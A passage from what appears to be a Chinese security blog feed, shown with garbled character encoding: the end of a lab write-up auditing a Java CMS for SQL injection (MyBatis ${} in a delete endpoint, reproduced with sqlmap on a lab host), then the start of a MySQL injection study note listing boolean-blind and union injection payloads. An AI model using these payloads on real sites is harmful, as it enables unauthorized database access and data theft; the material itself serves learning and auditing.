å¯åŠ¨ç½‘ç«™ï¼Œç‚¹å‡»å³ä¸Šè§’è¿è¡Œç¬¦å·è¿è¡Œï¼Œè™½ç„¶æœ‰æŠ¥é”™ï¼Œä½†ä¸å½±å“è¿è¡Œ<p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916233227501.png" data-caption="image-20220916233227501"><img src="/../images/Java/sql/image-20220916233227501.png" alt="image-20220916233227501"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916233245750.png" data-caption="image-20220916233245750"><img src="/../images/Java/sql/image-20220916233245750.png" alt="image-20220916233245750"></a></p><br/><h5 id="3ã€å®¡è®¡å¼€å§‹"><a href="#3ã€å®¡è®¡å¼€å§‹" class="headerlink" title="3ã€å®¡è®¡å¼€å§‹"></a><code>3ã€å®¡è®¡å¼€å§‹</code></h5><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>| ç›®å½•ç»“æ„            |  ä½œç”¨                                                  || ------------------ | -----------------------------------------------------  || src/main/java      | javaçš„ä»£ç ç›®å½•                                          || src/main/resources | èµ„æºç›®å½•ï¼Œå­˜æ”¾ä¸€äº›é…ç½®æ–‡ä»¶ï¼Œå¦‚propertiesã€spring-mvc.xmlç­‰ || src/main/webapp    | ä¼ ç»Ÿé¡¹ç›®çš„WebContentç›®å½•                                 || target             | ç¼–è¯‘åçš„æ–‡ä»¶                                             |</pre></td></tr></tbody></table></figure><br/><p>å®¡è®¡ä»£ç ä¸º <code>scr</code> ç›®å½•ä¸‹çš„ä»£ç ï¼Œå…ˆæŸ¥çœ‹å…¶ <code>web.xml</code> ,åˆ†æå…¶ä½¿ç”¨äº†å“ªäº›æ¡†æ¶ã€‚ <code>web.xml</code> æä¾›äº†è®¾ç½®åˆå§‹åŒ–å‚æ•°çš„åŠŸèƒ½ï¼Œå¼€å‘è€…ä¼šå°†ä¸€äº›é…ç½®ä¿¡æ¯å†™åˆ°é‡Œé¢å»ï¼Œé€šè¯» <code>web.xml</code> å¯ä»¥äº†è§£ç³»ç»Ÿä½¿ç”¨çš„æ¡†æ¶ç­‰åŸºæœ¬ä¿¡æ¯ï¼Œæœ‰æ—¶å€™å¼€å‘è€…è¿˜ä¼šæŠŠè´¦å·ä¿¡æ¯ç­‰æƒ…å†µå†™åœ¨é‡Œé¢ã€‚</p><p>é€šè¿‡åˆ†æï¼Œè¯¥ç½‘ç«™ä½¿ç”¨äº† <code>SSM</code> æ¡†æ¶ï¼Œå³ <code>Spring+Spring Mvc+Mybatis</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916144233146.png" data-caption="image-20220916144233146"><img src="/../images/Java/sql/image-20220916144233146.png" alt="image-20220916144233146"></a></p><p>æŸ¥çœ‹å…¶ç›®å½•ç»“æ„</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916144417442.png" data-caption="image-20220916144417442"><img src="/../images/Java/sql/image-20220916144417442.png" alt="image-20220916144417442"></a></p><br/><h5 id="4ã€å®¡è®¡SQLæ³¨å…¥"><a href="#4ã€å®¡è®¡SQLæ³¨å…¥" class="headerlink" title="4ã€å®¡è®¡SQLæ³¨å…¥"></a><code>4ã€å®¡è®¡SQLæ³¨å…¥</code></h5><p>æ–‡ä»¶æ¸…æ¥šçœ‹åˆ°ç³»ç»Ÿçš„ç»“æ„ï¼Œç‚¹å¼€daoæ–‡ä»¶ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œçœ‹çœ‹Mybatisæ˜¯ä½¿ç”¨äº†æ³¨è§£å¼€å‘è¿˜æ˜¯é…ç½®æ–‡ä»¶å¼€å‘ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ³¨è§£å¼€å‘ï¼šå³å¯ä¸ä½¿ç”¨ä»»ä½•çš„xmlé…ç½®æ–‡ä»¶æ¥å¼€å‘java webï¼Œç›´æ¥åœ¨ä»£ç ä¸­ä½“ç°ï¼Œä¸éœ€è¦å•ç‹¬ç¼–å†™xmlæ–‡ä»¶</span><br><span class="line">é…ç½®æ–‡ä»¶å¼€å‘ï¼šç¼–å†™xmlé…ç½®æ–‡ä»¶æ¥æ˜ å°„ç›¸åº”çš„ä»£ç </span><br></pre></td></tr></table></figure></div><p>æ–‡ä»¶åªå®šä¹‰äº†ä¸€äº›æ–¹æ³•ï¼Œå¹¶æ²¡æœ‰è¯¦ç»†çš„Mybatisçš„æ³¨è§£ï¼Œæ‰€ä»¥è¯¥ CMS ä½¿ç”¨äº† XML é…ç½®æ–¹æ³•</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916153458532.png" data-caption="image-20220916153458532"><img src="/../images/Java/sql/image-20220916153458532.png" alt="image-20220916153458532"></a></p><p>å¯»æ‰¾ XML é…ç½®æ–‡ä»¶ï¼ŒXML é…ç½®çš„æ˜ å°„æ–‡ä»¶ä¼šå’Œ dao çš„æ¥å£åœ¨åŒå±‚ç›®å½•ä¸‹ <code>resource/mybatis/index/article</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916153744387.png" data-caption="image-20220916153744387"><img src="/../images/Java/sql/image-20220916153744387.png" alt="image-20220916153744387"></a></p><p>æ ¹æ®ä¸Šé¢çš„çŸ¥è¯†ç‚¹å¯çŸ¥ï¼Œè‹¥ä½¿ç”¨äº† <code>$&#123;&#125;</code> åˆ™å¯èƒ½å­˜åœ¨ SQL æ³¨å…¥ï¼Œç›´æ¥åœ¨ XML é…ç½®æ–‡ä»¶å¯»æ‰¾ <code>$</code> ç¬¦å·ï¼Œå‘ç°<code>deleteArticleByIds</code>ä½¿ç”¨äº† <code>$&#123;&#125;</code>,ç¬¦åˆä¸Šé¢çŸ¥è¯†ç‚¹ in å‚æ•°åæ³¨å…¥ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916155038180.png" data-caption="image-20220916155038180"><img src="/../images/Java/sql/image-20220916155038180.png" alt="image-20220916155038180"></a></p><p>daoæ–‡ä»¶å¤¹æ‰¾å¯»XMLé…ç½®æ–‡ä»¶å¯¹åº”æ˜ å°„çš„ <code>deleteArticleByIds</code> æ¥å£</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916155406997.png" data-caption="image-20220916155406997"><img src="/../images/Java/sql/image-20220916155406997.png" alt="image-20220916155406997"></a></p><p>Ctrl + é¼ æ ‡å·¦é”®é€‰ä¸­ <code>deleteArticleByIds</code> æŸ¥çœ‹ä»£ç ä¸­å“ªäº›ç±»è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œåˆæ­¥å‘ç°ä»£ç æ²¡æœ‰è¿›è¡Œè¿‡æ»¤å¤„ç†</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916155943404.png" data-caption="image-20220916155943404"><img src="/../images/Java/sql/image-20220916155943404.png" alt="image-20220916155943404"></a></p><p>è·Ÿè¿›ä»£ç çš„ Controllerï¼ˆæ§åˆ¶å™¨ï¼‰ï¼Œé€‰æ‹© <code>deleteArticleByIds</code> ï¼ŒCtrl+Alt+Hå¿«æ·é”®å»æŸ¥è¯¢è°ƒç”¨å±‚æ¬¡ï¼Œå»çœ‹Controllerçš„ä½ç½®</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916160453470.png" data-caption="image-20220916160453470"><img src="/../images/Java/sql/image-20220916160453470.png" alt="image-20220916160453470"></a></p><p>æŸ¥çœ‹ <code>Controller</code> æ–‡ä»¶ï¼Œå¯»æ‰¾åˆ°ç›®å½•è·¯å¾„ä¸ºï¼š<code>/admin/article</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916160956840.png" data-caption="image-20220916160956840"><img src="/../images/Java/sql/image-20220916160956840.png" alt="image-20220916160956840"></a></p><p>æŸ¥çœ‹å…·ä½“è°ƒç”¨ä½ç½®,ä½ç½®ä¸ºï¼š<code>/delete</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916161203467.png" data-caption="image-20220916161203467"><img src="/../images/Java/sql/image-20220916161203467.png" alt="image-20220916161203467"></a></p><p>æ‰€ä»¥æ¼æ´å…·ä½“ä½ç½®ä¸ºï¼š <code>http://192.168.114.131:82/admin/article/delete</code> , è®¿é—®åå‘ç°ä¸ºåå°æ³¨å…¥ï¼Œé¶åœºå¯†ç ä¸ºï¼š<code>admin/111111</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220917105051989.png" data-caption="image-20220917105051989"><img src="/../images/Java/sql/image-20220917105051989.png" alt="image-20220917105051989"></a></p><p>å†æ¬¡è®¿é—® <code>http://192.168.114.131:82/admin/article/delete</code> ç½‘ç«™é¡µé¢è‡ªåŠ¨è·³è½¬è‡³ä¸‹é¢ä»¥ä¸‹é“¾æ¥<br><code>http://192.168.114.131:82/admin/article/showlist? </code>ç‚¹å‡»åˆ é™¤æŠ“å–æ•°æ®åŒ…</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916163457592.png" data-caption="image-20220916163457592"><img src="/../images/Java/sql/image-20220916163457592.png" alt="image-20220916163457592"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916163649650.png" data-caption="image-20220916163649650"><img src="/../images/Java/sql/image-20220916163649650.png" alt="image-20220916163649650"></a></p><p>é€šè¿‡sqlmapæˆåŠŸè·‘å‡ºæ•°æ®ï¼Œå¤ç°æˆåŠŸ</p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916164206987.png" data-caption="image-20220916164206987"><img src="/../images/Java/sql/image-20220916164206987.png" alt="image-20220916164206987"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/sql/image-20220916164227132.png" data-caption="image-20220916164227132"><img src="/../images/Java/sql/image-20220916164227132.png" alt="image-20220916164227132"></a></p><h2 id="å‘ç‚¹"><a href="#å‘ç‚¹" class="headerlink" title="å‘ç‚¹"></a>å‘ç‚¹</h2><p>1ã€æ•°æ®åº“åç§°å¿…é¡»ä¸º <code>demo_inxedu_v2_0_open</code> ,å¦åˆ™ä¼šæŠ¥é”™<br>2ã€IDEA æ­å»ºç½‘ç«™ä¸­ä¼šå‡ºç°å„ç§æŠ¥é”™æ— æ³•è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œå½“æ‰¾åˆ°è§£å†³æ–¹æ¡ˆåï¼Œè®°å¾—æ¸…ç†ç¼“å­˜<code>ï¼ˆclean &amp;&amp; installï¼‰</code>å† Runï¼Œå¦åˆ™ä¼šå‡ºç°ç½‘ç«™æ— æ³•å¯åŠ¨çš„æƒ…å†µ<br>3ã€è‹¥ <code>phpstudy</code>åˆ›å»º <code>demo_inxedu_v2_0_open</code> æ•°æ®åº“æç¤ºæ•°æ®åº“å·²å­˜åœ¨æ—¶ï¼Œè¿›å…¥rootæ•°æ®åº“æŸ¥çœ‹æ˜¯å¦å·²ç»å­˜åœ¨è¿™ä¸ªæ•°æ®åº“ï¼Œç„¶åè¿›è¡Œåˆ é™¤,å†æ¬¡å¯¼å…¥å³å¯</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><code>https://github.com/j3ers3/Hello-Java-Sec</code><br><code>https://theoyu.top/2022/04/27/Java-Prepstatementared.html</code><br><code>https://www.cnblogs.com/nice0e3/p/13647511.html#0x01-jdbc-%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90</code><br><code>https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q</code></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> Javaä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥å­¦ä¹ ç¬”è®°-MYSQLæ³¨å…¥</title>
      <link href="/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>SQLI(SQL Injection)ï¼Œ SQLæ³¨å…¥æ˜¯å› ä¸ºç¨‹åºæœªèƒ½æ­£ç¡®å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œæ£€æŸ¥ï¼Œå°†ç”¨æˆ·çš„è¾“å…¥ä»¥æ‹¼æ¥çš„æ–¹å¼å¸¦å…¥SQLè¯­å¥ï¼Œå¯¼è‡´äº†SQLæ³¨å…¥çš„äº§ç”Ÿã€‚æ”»å‡»è€…å¯é€šè¿‡SQLæ³¨å…¥ç›´æ¥è·å–æ•°æ®åº“ä¿¡æ¯ï¼Œé€ æˆä¿¡æ¯æ³„æ¼ã€‚ </p><h2 id="boolç›²æ³¨"><a href="#boolç›²æ³¨" class="headerlink" title="boolç›²æ³¨"></a>boolç›²æ³¨</h2><p><code>ä¸€ã€ç›²æ³¨å¸¸ç”¨å‡½æ•°</code></p><table><thead><tr><th>å‡½æ•°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>length()</td><td>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œä¾‹å¦‚å¯ä»¥è¿”å›æ•°æ®åº“åå­—çš„é•¿åº¦</td></tr><tr><td>substr()</td><td>æˆªå–å­—ç¬¦ä¸²,åç§»ä»1å¼€å§‹ï¼Œéä»0å¼€å§‹</td></tr><tr><td>ascii()</td><td>è¿”å›å­—ç¬¦çš„asciiç </td></tr><tr><td>sleep(n)</td><td>å°†ç¨‹åºæŒ‚èµ·â¼€æ®µæ—¶é—´ï¼Œnä¸ºnç§’</td></tr><tr><td>if(expr1,expr2,expr3)</td><td>åˆ¤æ–­è¯­å¥ å¦‚æœç¬¬â¼€ä¸ªè¯­å¥æ­£ç¡®å°±æ‰§â¾ç¬¬â¼†ä¸ªè¯­å¥å¦‚æœé”™è¯¯æ‰§â¾ç¬¬ä¸‰ä¸ªè¯­å¥</td></tr><tr><td>mid()</td><td>mid(a,b,c)ä»ä½ç½®bå¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cä½</td></tr><tr><td><br/></td><td></td></tr></tbody></table><p><code>äºŒã€åˆ¤æ–­æ³¨å…¥ç‚¹</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹?id=1' and 1=1 --+(æ­£å¸¸é¡µé¢)?id=1' and 1=2 --+(æŠ¥é”™é¡µé¢ï¼Œé¡µé¢æ— ä»»ä½•å›æ˜¾)<p>â¤ æœ‰æ—¶å€™ç³»ç»Ÿä¼šå°† 1&#x3D;1 è¿‡æ»¤æ‰sqlè¯­å¥ï¼Œæ­¤æ—¶å¯å°è¯•å…¶ä»–æ•°å€¼<br>?id&#x3D;1â€™ and 1352&#x3D;1352 (æ­£å¸¸é¡µé¢)<br>?id&#x3D;1â€™ and 1352&#x3D;1452 (æŠ¥é”™é¡µé¢ï¼Œé¡µé¢æ— ä»»ä½•å›æ˜¾)</p><p>1â€™ AND 4003&#x3D;4003 AND â€˜Vvmuâ€™&#x3D;â€™Vvmuâ€™<br>1â€™ AND 4302&#x3D;4302 AND â€˜kBOZâ€™ like â€˜kBOZâ€™</p><p>â¤ å­—ç¬¦å‹ç›²æ³¨è¿˜éœ€è¦é—­åˆå•å¼•å·<br>1â€™ and â€˜1â€™&#x3D;â€™1<br>1â€™ orâ€™1â€™&#x3D;â€™2<br></pre></p></td></tr></tbody></table></figure><p><code>ä¸‰ã€çŒœè§£æ•°æ®åº“</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ çŒœè§£æ•°æ®åº“åé•¿åº¦1' and length(database())=1 --+# çŒœè§£æ•°æ®åº“åé•¿åº¦ä¸º1ï¼Œè¿”å›é”™è¯¯é¡µé¢1' and length(database())=8 --+ # çŒœè§£æ•°æ®åº“åé•¿åº¦ä¸º8ï¼Œè¿”å›æ­£å¸¸é¡µé¢ï¼Œå³æ•°æ®åº“åé•¿åº¦ä¸º8<p>â¤ çŒœè§£æ•°æ®åº“åç¬¬ä¸€ä¸ªå­—ç¬¦<br>1â€™ and ascii(substr(database(),1,1))&gt;114 â€“+# æ­£ç¡®é¡µé¢ï¼Œè¯´æ˜æ•°æ®åº“åçš„ç¬¬â¼€ä¸ªå­—ç¬¦çš„asciiå€¼â¼¤äº 114ï¼ˆå¤§å†™å­—æ¯Rçš„asciiå€¼ï¼‰ï¼›<br>1â€™ and ascii(substr(database(),1,1))&gt;115 â€“+# é”™è¯¯é¡µé¢ï¼Œè¯´æ˜æ•°æ®åº“åçš„ç¬¬â¼€ä¸ªå­—ç¬¦çš„asciiå€¼ä¸å¤§äº115ï¼ˆå¤§å†™å­—æ¯Sçš„asciiå€¼ï¼‰ï¼›<br>1â€™ and ascii(substr(database(),1,1))&#x3D;115 â€“+# æ˜¾ç¤ºæ­£ç¡®ï¼Œè¯æ˜è¯¥æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºâ€Sâ€</p><p>â¤ çŒœè§£æ•°æ®åº“åç¬¬2ä¸ªå­—ç¬¦<br>1â€™ and ascii(substr(database(),2,1))&gt;100 â€“+# æ­£ç¡®é¡µé¢ï¼Œè¯´æ˜ç¬¬äºŒä¸ªå­—ç¬¦ascillå€¼å¤§äº100<br>1â€™ and ascii(substr(database(),2,1))&gt;101 â€“+# é”™è¯¯é¡µé¢ï¼Œè¯´æ˜ç¬¬äºŒä¸ªascillå€¼å°‘äº101<br>1â€™ and ascii(substr(database(),2,1))&#x3D;101 â€“+# æ­£ç¡®é¡µé¢ï¼Œç¬¬äºŒä¸ªå­—ç¬¦ascillå€¼ä¸º101ï¼Œå¯¹åº”å­—ç¬¦ä¸ºâ€eâ€</p><p>ä»¥æ­¤ç±»æ¨â€¦â€¦ç›´åˆ°å°†8ä¸ªå­—ç¬¦å…¨éƒ¨çŒœè§£æˆåŠŸ<br></pre></p></td></tr></tbody></table></figure><p><code>å››ã€çŒœè§£æ•°æ®è¡¨</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ çŒœè§£æ•°æ®åº“å­˜åœ¨å¤šå°‘ä¸ªæ•°æ®è¡¨1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 --+# é”™è¯¯é¡µé¢ï¼Œè¯´æ˜ä¸æ˜¯åªæœ‰ä¸€ä¸ªæ•°æ®è¡¨1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+ # æ­£ç¡®é¡µé¢ï¼Œè¯´æ˜è¯¥æ•°æ®åº“å­˜åœ¨4ä¸ªæ•°æ®è¡¨<p>â¤ çŒœè§£ç¬¬ä¸€ä¸ªè¡¨é•¿åº¦<br>1â€™ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;7 â€“+# é”™è¯¯é¡µé¢ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªè¡¨é•¿åº¦ä¸æ˜¯7<br>1â€™ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;10 â€“+# æ­£ç¡®é¡µé¢ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªè¡¨é•¿åº¦ä¸º10</p><p>â¤ è‹¥æƒ³çŒœè§£è¯¥æ•°æ®åº“çš„ç¬¬äºŒä¸ªè¡¨é•¿åº¦ï¼Œåªéœ€æ›´æ”¹ä¸º limit 1ï¼Œ1å³å¯ï¼Œè‹¥çŒœè§£ç¬¬ä¸‰ä¸ªè¡¨æ›´æ”¹ä¸º limit 2,1<br>1â€™ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1))&#x3D;8 â€“+</p><p>ä»¥æ­¤ç±»æ¨â€¦â€¦<br></pre></p></td></tr></tbody></table></figure><p><code>äº”ã€çŒœè§£è¡¨ä¸­å­—æ®µå</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ çŒœè§£ä¸€ä¸ªè¡¨ä¸­å­—æ®µæ•°1' and (select count(column_name) from information_schema.columns where table_name='æ•°æ®è¡¨å')=1 --+# é¡µé¢é”™è¯¯ï¼Œè¯´æ˜å­—æ®µæ•°ä¸ä¸º11' and (select count(column_name) from information_schema.columns where table_name='æ•°æ®è¡¨å')=2 --+# é¡µé¢æ­£ç¡®ï¼Œè¯´æ˜å­—æ®µæ•°ä¸º2<p>è‹¥æƒ³çŒœè§£è¯¥è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå­—æ®µåé•¿åº¦ï¼Œåªéœ€æ·»åŠ  limit 1,1å³å¯ï¼Œè‹¥çŒœè§£ç¬¬ä¸‰ä¸ªå­—æ®µåé•¿åº¦æ·»åŠ  limit 2,1<br>?id&#x3D;1â€™ and length(substr((select column_name from information_schema.columns where table_name&#x3D; â€˜æ•°æ®è¡¨åâ€™ limit 1,1),1))&#x3D;5 â€“+</p><p>â¤ çŒœè§£ç¬¬ä¸€ä¸ªå­—æ®µåï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦<br>1â€™ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; â€˜æ•°æ®è¡¨åâ€™ limit 1,1),1,1))&#x3D;107 â€“+# é¡µé¢é”™è¯¯ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—æ®µåç¬¬ä¸€ä¸ªå­—ç¬¦ascillå€¼ä¸ä¸º107<br>1â€™ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; â€˜æ•°æ®è¡¨åâ€™ limit 1,1),1,1))&#x3D;105 â€“+# é¡µé¢æ­£ç¡®ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—æ®µåç¬¬ä¸€ä¸ªå­—ç¬¦ascillå€¼ä¸º105</p><p>â¤ çŒœè§£ç¬¬ä¸€ä¸ªå­—æ®µåï¼Œç¬¬äºŒä¸ªå­—ç¬¦<br>1â€™ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; â€˜æ•°æ®è¡¨åâ€™ limit 1,1),1,1))&#x3D;100 â€“+# é¡µé¢é”™è¯¯ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—æ®µåï¼Œç¬¬äºŒä¸ªå­—ç¬¦ascillå€¼ä¸ä¸º100<br>1â€™ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; â€˜emailsâ€™ limit 1,1),1,1))&#x3D;101 â€“+   # é¡µé¢æ­£ç¡®ï¼Œè¯´æ˜ç¬¬ä¸€ä¸ªå­—æ®µåï¼Œç¬¬äºŒä¸ªå­—ç¬¦ascillå€¼ä¸º101<br></pre></p></td></tr></tbody></table></figure><p><code>å…­ã€çŒœè§£æ•°æ®</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ çŒœè§£æ•°æ®1' and ascii(substr((select å­—æ®µå from æ•°æ®åº“è¡¨å limit 0,1),1,1))=30 --+# é¡µé¢é”™è¯¯ï¼Œç¬¬ä¸€ä¸ªæ•°æ®å­—ç¬¦ascillå€¼ä¸ä¸º301' and ascii(substr((select å­—æ®µå from æ•°æ®è¡¨å limit 0,1),1,1))=49 --+  # é¡µé¢æ­£ç¡®ï¼Œç¬¬ä¸€ä¸ªæ•°æ®å­—ç¬¦ascillå€¼ä¸º49</pre></td></tr></tbody></table></figure><p><code>ä¸ƒã€åˆ©ç”¨å­—å…¸è¿›è¡Œæš´åŠ›ç ´è§£</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ ç›´æ¥çŒœè§£æ•°æ®æ˜¯å¦ä¸º"admin"1' and (select count(*) from æ•°æ®è¡¨å where å­—æ®µå = 'admin') = 1 --+</pre></td></tr></tbody></table></figure><h2 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h2><p><code>ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­æ³¨å…¥ç±»å‹</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ æ•´å½¢åˆ¤æ–­ï¼Œä»¥ä¸‹è¯­å¥ï¼Œè‹¥é¡µé¢æœ‰æ‰€å˜åŒ–åˆ™å¯èƒ½å­˜åœ¨æ•´å½¢æ³¨å…¥?id=1 and 1=1?id=1 and 1=2<p>â¤ å­—ç¬¦å‹åˆ¤æ–­ï¼Œä»¥ä¸‹è¯­å¥ï¼Œè‹¥é¡µé¢æœ‰æ‰€å˜åŒ–åˆ™å¯èƒ½å­˜åœ¨å­—ç¬¦å‹æ³¨å…¥<br>?id&#x3D;1â€™ and 1&#x3D;1<br>?id&#x3D;1â€™ and 1&#x3D;2<br></pre></p></td></tr></tbody></table></figure><p><code>ç¬¬äºŒæ­¥ã€åˆ¤æ–­å­—æ®µæ•°ï¼Œé€šè¿‡ order by è¯­å¥ï¼Œå¦‚æœåé¢è¾“å…¥çš„æ•°å­—å¤§äºæ•°æ®åº“çš„å­—æ®µæ•°ï¼Œé¡µé¢å°±ä¼šæŠ¥é”™ï¼Œæ­£å¸¸è‹¥å°‘äºå­—æ®µæ•°åˆ™è¡¨ç°ä¸ºæ­£å¸¸é¡µé¢</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ æ•´å½¢?id=1 order by 5ï¼ˆé¡µé¢æŠ¥é”™ï¼‰?id=1 order by 4ï¼ˆé¡µé¢æ­£å¸¸ï¼Œå­—æ®µæ•°ä¸º4ï¼‰<p>â¤ å­—ç¬¦å‹<br>?id&#x3D;1â€™ order by 5ï¼ˆé¡µé¢æŠ¥é”™ï¼‰<br>?id&#x3D;1â€™ order by 4ï¼ˆé¡µé¢æ­£å¸¸ï¼Œå­—æ®µæ•°ä¸º4ï¼‰<br></pre></p></td></tr></tbody></table></figure><p><code>ç¬¬ä¸‰æ­¥ï¼šåˆ¤æ–­å›æ˜¾ç‚¹ï¼Œé€šè¿‡ä¸Šä¸€æ­¥çŸ¥é“å­—æ®µæ•°ä¸º4ï¼Œæ‰€ä»¥åœ¨è”åˆæŸ¥è¯¢æ—¶å¿…é¡»è¦å¯¹åº”4ä¸ªæŸ¥è¯¢ç‚¹ï¼Œä½¿ç”¨è”åˆæŸ¥è¯¢ï¼ˆunionï¼‰è·å–å›æ˜¾ç‚¹ï¼Œç„¶åæ„é€ è¯­å¥è·å–æ•°æ®åº“å</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ union select 1,2,3,4 --+<p>â¤ union select 1,database(),user(),4 â€“+<br>å¦‚ä¸Šï¼Œå½“è¾“å…¥ç¬¬ä¸€æ¡è¯­å¥æ—¶ï¼Œç½‘é¡µå‡ºç°2,3å›æ˜¾ï¼Œåˆ™åœ¨2,3å‡ºå¯æ„é€ è¯­å¥è¿›è¡Œè”åˆæŸ¥è¯¢<br></pre></p></td></tr></tbody></table></figure><p><code>ç¬¬å››æ­¥ï¼šé€šè¿‡åœ¨å›æ˜¾ç‚¹å¤„æ„é€ æ³¨å…¥ä»£ç (åœ¨æŠ¥é”™é¡µé¢ä¸Šè¿›è¡ŒæŸ¥è¯¢ï¼Œå³?id=1&#39; ã€ and 1=2ç­‰é¡µé¢)</code></p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>â¤ æŸ¥è¯¢æ•°æ®åº“?id=97 and 1=2 union select 1,2,3,4,databaseï¼ˆï¼‰,6,7,8,9,10<p>â¤ 